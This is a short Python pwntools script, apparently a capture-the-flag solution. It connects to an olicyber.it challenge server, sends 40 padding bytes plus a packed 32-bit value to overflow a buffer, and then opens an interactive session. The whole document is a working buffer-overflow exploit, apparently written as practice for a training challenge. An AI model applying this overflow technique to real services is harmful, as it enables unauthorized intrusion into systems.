from pwn import *
r = remote("lil-overflow.challs.olicyber.it", 34002)
r.recv(100)
gab = p32(0x5ab1bb0, endianness="little")
r.sendline(b's'*40 + gab)
r.interactive()
r.recv()
r.recv()
print(r.recv())
